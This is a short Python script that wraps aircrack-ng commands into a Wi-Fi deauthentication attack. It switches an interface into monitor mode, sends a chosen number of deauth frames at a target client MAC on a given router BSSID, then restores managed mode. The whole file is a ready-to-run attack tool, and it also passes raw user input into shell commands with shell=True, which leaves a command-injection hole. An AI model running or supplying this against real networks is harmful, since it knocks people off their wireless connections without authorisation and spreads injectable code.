from subprocess import call as execute_call


class Deauther:
    def __init__(self, network_interface, network_channel, router_bssid):
        self.network_interface = network_interface
        self.network_channel = network_channel
        self.router_bssid = router_bssid

    def deauth_device(self, target_mac, package_number):
        target_mac = target_mac
        package_number = package_number
        try:
            execute_call("airmon-ng check kill", shell=True)
            monitor_mode_prompt = f"airmon-ng start {self.network_interface} {str(self.network_channel.split(":")[-1])}"
            execute_call(monitor_mode_prompt, shell=True)
            deauth_prompt = f"aireplay-ng -0 {package_number} -a {self.router_bssid} -c {target_mac} {self.network_interface}"
            execute_call(deauth_prompt, shell=True)
            execute_call(f"ifconfig {self.network_interface} down", shell=True)
            execute_call(f"iwconfig {self.network_interface} mode manage", shell=True)
            execute_call(f"ifconfig {self.network_interface} up", shell=True)
            execute_call(f"systemctl restart NetworkManager", shell=True)
            print("\nTarget deauthenticated!")
        except KeyboardInterrupt:
            execute_call(f"ifconfig {self.network_interface} down", shell=True)
            execute_call(f"iwconfig {self.network_interface} mode manage", shell=True)
            execute_call(f"ifconfig {self.network_interface} up", shell=True)
            execute_call(f"systemctl restart NetworkManager", shell=True)
            print("\nAttack canceled!")

if __name__ == "__main__":
    target_mac, package_number, network_interface, network_channel, router_bssid = input("Enter target_mac, package_number, network_interface, network_channel, router_bssid -> ").split()
    deauther = Deauther(network_interface, network_channel, router_bssid)
    deauther.deauth_device(target_mac, package_number)